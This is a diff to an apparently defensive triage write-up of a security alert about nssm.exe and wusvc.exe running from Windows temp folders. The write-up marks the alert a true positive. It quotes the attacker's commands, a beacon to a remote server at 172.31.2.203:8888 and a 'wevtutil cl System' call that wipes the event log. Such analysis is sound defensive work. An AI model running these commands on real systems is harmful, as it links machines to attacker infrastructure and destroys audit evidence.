@@ -8,12 +8,17 @@
 
 **Verdict:** True positive 
 
+
 <img width="597" height="298" alt="image" src="https://github.com/user-attachments/assets/d3e0c2fa-d6a9-4751-96fc-1c559f9a913d" />
 
 
 
-**Image file path:** \Device\HarddiskVolume1\Windows\Temp\nssm\nssm-2.24-101-
-g897c7ad\win64\nssm.exe
+
+
+**Image file path:** 
+
+\Device\HarddiskVolume1\Windows\Temp\nssm\nssm-2.24-101-g897c7ad\win64\nssm.exe
+
 
 **Command Line:**
 
@@ -22,6 +27,8 @@ Some of commands are:
 "wusvc.exe" -server http://172.31.2.203:8888 -group red
 
 cmd.exe /C wevtutil cl System
+
+**Note:**  nssm.exe and wusvc.exe are running from temporary folders. A connection to malicious IP address (172.31.2.203) has been made.
 
 **Why was the alert triggered?**
 
